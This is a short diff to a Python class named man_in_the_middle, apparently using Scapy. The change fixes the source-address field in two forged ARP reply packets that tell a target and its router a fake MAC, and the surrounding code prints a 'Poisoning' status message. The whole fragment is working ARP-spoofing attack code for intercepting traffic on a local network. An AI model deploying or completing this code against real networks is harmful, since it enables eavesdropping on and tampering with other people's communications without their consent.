@@ -37,8 +37,8 @@ class man_in_the_middle():
         # fake_mac = "00:11:22:33:44:55"  
         
         #ARP Broadcast Packet
-        packet_for_target = Ether(dst=router_mac, src=) / ARP(op=2, psrc=target_ip, hwsrc=fake_mac, hwdst=router_mac, pdst=router_ip)
-        packet_for_router = Ether(dst=target_mac,src=) / ARP(op=2, psrc=router_ip, hwsrc=fake_mac, hwdst=target_mac, pdst=target_ip)
+        packet_for_target = Ether(dst=router_mac, src=hwsrc) / ARP(op=2, psrc=target_ip, hwsrc=fake_mac, hwdst=router_mac, pdst=router_ip)
+        packet_for_router = Ether(dst=target_mac,src=hwsrc) / ARP(op=2, psrc=router_ip, hwsrc=fake_mac, hwdst=target_mac, pdst=target_ip)
         iface = conf.iface
 
         console.print(f"[yellow]Poisoning {target_ip} and {router_ip}...")
